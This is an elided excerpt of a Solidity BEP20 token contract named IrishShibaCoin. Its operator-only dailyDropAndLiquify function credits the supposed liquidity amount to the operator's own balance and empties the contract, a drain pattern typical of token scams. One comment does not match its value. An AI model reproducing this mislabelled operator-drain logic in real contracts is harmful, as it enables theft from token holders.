...
contract IrishShibaCoin is IBEP20, Ownable {
    ...
    string private constant _symbol = "IST5";
    ...
    uint public transferTax = 0;				// 0%
	  uint public minTokensToLiquify = 777 * 10**3 * 10**_decimals;				// 0%    
    ...
    function dailyDropAndLiquify() public onlyOperator {
      ...
      _balances[winner] = _balances[winner] + winnerAmount;
      if (liquidityAmount > minTokensToLiquify) {
        ...
        _balances[operator] = _balances[operator] + liquidityAmount + operationAmount;
        _balances[address(this)] = 0;
      }
